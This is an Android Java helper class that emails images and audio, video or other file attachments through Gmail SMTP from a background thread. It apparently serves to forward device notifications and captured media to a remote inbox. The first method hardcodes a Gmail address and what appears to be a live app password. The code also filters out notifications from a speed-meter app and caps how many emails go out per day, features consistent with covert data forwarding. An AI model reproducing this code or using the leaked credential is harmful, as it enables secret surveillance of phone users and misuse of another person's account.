package com.example.fasterpro11;

import android.annotation.SuppressLint;
import android.graphics.Bitmap;
import android.util.Log;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.util.ByteArrayDataSource;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.List;
import java.util.Properties;

public class JavaMailAPISendNotification {

    private static final List<String> BLOCKED_SUBJECTS = Arrays.asList(
            "Notification from com.internet.speed.meter.lite",
            "Title: Speed: 10 KB/s     Signal 100%"
    );

    // Method to send email with Bitmap image
    @SuppressLint("LongLogTag")
    public static void sendMail(String recipientEmail, String subject, String messageBody, Bitmap image) {
        // Check for blocked subjects
        for (String blockedSubject : BLOCKED_SUBJECTS) {
            if (subject.contains(blockedSubject)) {
                Log.d("JavaMailAPISendNotification", "Email not sent: Subject is blocked.");
                return;
            }
        }

        // Daily limit check
        if (!CountEmail.canSendEmail()) {
            Log.d("JavaMailAPISendNotification", "Email limit reached for today. No email sent.");
            return;
        }

        final String username = "abontiangum99@gmail.com"; // আপনার ইমেইল
        final String password = "egqnjvccoqtgwaxo"; // আপনার পাসওয়ার্ড

        Thread thread = new Thread(() -> {
            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");

            Session session = null;
            try {
                session = Session.getInstance(props,
                        new javax.mail.Authenticator() {
                            protected PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(username, password);
                            }
                        });
            } catch (Exception e) {
                Log.e("JavaMailAPISendNotification", "Error occurred while creating session: " + e.getMessage(), e);
                return; // সেশন তৈরি ব্যর্থ হলে প্রক্রিয়া থামান
            }

            try {
                // Creating email message
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(username));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));
                message.setSubject(subject);

                // Create multipart message
                MimeBodyPart textPart = new MimeBodyPart();
                textPart.setText(messageBody);

                MimeMultipart multipart = new MimeMultipart();
                multipart.addBodyPart(textPart);

                // Add image attachment if available
                if (image != null) {
                    MimeBodyPart imagePart = new MimeBodyPart();
                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                    image.compress(Bitmap.CompressFormat.PNG, 100, stream);
                    byte[] byteArray = stream.toByteArray();
                    DataSource dataSource = new ByteArrayDataSource(byteArray, "image/png");

                    imagePart.setDataHandler(new DataHandler(dataSource));
                    imagePart.setFileName("image.png");

                    multipart.addBodyPart(imagePart);
                }

                message.setContent(multipart);

                try {
                    // Sending the email
                    Transport.send(message);
                    CountEmail.incrementEmailCount(); // Increment count after successful email
                    Log.d("JavaMailAPISendNotification", "Email sent successfully");
                } catch (MessagingException e) {
                    Log.e("JavaMailAPISendNotification", "Failed to send email: " + e.getMessage(), e);
                    e.printStackTrace();
                }
            } catch (MessagingException e) {
                Log.e("JavaMailAPISendNotification", "Messaging exception occurred: " + e.getMessage(), e);
                e.printStackTrace();
            } catch (Exception e) {
                Log.e("JavaMailAPISendNotification", "Unexpected error while sending email: " + e.getMessage(), e);
                e.printStackTrace();
            }
        });
        thread.start();
    }

    // Method to send email with byte array file data
    @SuppressLint("LongLogTag")
    public static void sendMail(String recipientEmail, String subject, String messageBody, byte[] fileData, String fileName) {
        // Check for blocked subjects
        for (String blockedSubject : BLOCKED_SUBJECTS) {
            if (subject.contains(blockedSubject)) {
                Log.d("JavaMailAPISendNotification", "Email not sent: Subject is blocked.");
                return;
            }
        }

        // Daily limit check
        if (!CountEmail.canSendEmail()) {
            Log.d("JavaMailAPISendNotification", "Email limit reached for today. No email sent.");
            return;
        }

        final String username = "your_email@gmail.com"; // Your Gmail address
        final String password = "your_password"; // Your Gmail password

        Thread thread = new Thread(() -> {
            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");

            Session session = null;
            try {
                session = Session.getInstance(props,
                        new javax.mail.Authenticator() {
                            protected PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(username, password);
                            }
                        });
            } catch (Exception e) {
                Log.e("JavaMailAPISendNotification", "Error occurred while creating session: " + e.getMessage(), e);
                return; // সেশন তৈরি ব্যর্থ হলে প্রক্রিয়া থামান
            }

            try {
                // Creating email message
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(username));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));
                message.setSubject(subject);

                // Create multipart message
                MimeBodyPart textPart = new MimeBodyPart();
                textPart.setText(messageBody);

                MimeMultipart multipart = new MimeMultipart();
                multipart.addBodyPart(textPart);

                // Add file attachment if available
                if (fileData != null) {
                    MimeBodyPart filePart = new MimeBodyPart();
                    String mimeType = "application/octet-stream"; // Default MIME type
                    if (fileName.endsWith(".mp3")) {
                        mimeType = "audio/mpeg";
                    } else if (fileName.endsWith(".mp4")) {
                        mimeType = "video/mp4";
                    } else if (fileName.endsWith(".png")) {
                        mimeType = "image/png";
                    }
                    DataSource dataSource = new ByteArrayDataSource(fileData, mimeType);
                    filePart.setDataHandler(new DataHandler(dataSource));
                    filePart.setFileName(fileName);
                    multipart.addBodyPart(filePart);
                }

                message.setContent(multipart);

                try {
                    // Sending the email
                    Transport.send(message);
                    CountEmail.incrementEmailCount(); // Increment count after successful email
                    Log.d("JavaMailAPISendNotification", "Email sent successfully");
                } catch (MessagingException e) {
                    Log.e("JavaMailAPISendNotification", "Failed to send email: " + e.getMessage(), e);
                    e.printStackTrace();
                }
            } catch (MessagingException e) {
                Log.e("JavaMailAPISendNotification", "Messaging exception occurred: " + e.getMessage(), e);
                e.printStackTrace();
            } catch (Exception e) {
                Log.e("JavaMailAPISendNotification", "Unexpected error while sending email: " + e.getMessage(), e);
                e.printStackTrace();
            }
        });
        thread.start();
    }
}
